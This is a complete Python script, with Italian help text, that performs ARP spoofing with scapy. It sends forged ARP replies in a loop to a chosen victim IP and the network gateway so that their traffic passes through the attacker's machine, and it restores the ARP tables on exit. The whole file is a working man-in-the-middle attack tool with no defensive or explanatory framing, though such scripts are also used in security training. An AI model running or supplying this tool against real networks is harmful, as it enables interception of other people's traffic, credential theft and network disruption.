#!/usr/bin/env python3

import scapy.all as scapy
import time
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="L'IP del subnetwork della vittima")
    parser.add_option("-g", "--gateway", dest="gateway", help="L'IP del gateway del subnetwork")
    parser.add_option("-i", "--interface", dest="iface", help="L'interfaccia su cui eseguire lo spoof")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error(
            "[-] Per favore specifica l'IP della vittima dello spoof. Scrivi --help per ulteriori info."
        )
    if not options.gateway:
        parser.error(
            "[-] Per favore specifica il gateway del network su cui eseguire l'attacco."
            "Scrivi --help per ulteriori info."
        )
    if not options.iface:
        parser.error(
            "[-] Per favore specifica un'interfaccia di rete. Scrivi --help per ulteriori info."
        )
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=iface)


def restore(destination_ip, source_ip, iface):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False, iface=iface)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway
interface = options.iface

sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip, interface)
        spoof(gateway_ip, target_ip, interface)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP tables...")
    restore(target_ip, gateway_ip, interface)
    restore(gateway_ip, target_ip, interface)
    print("[+] Exiting.")
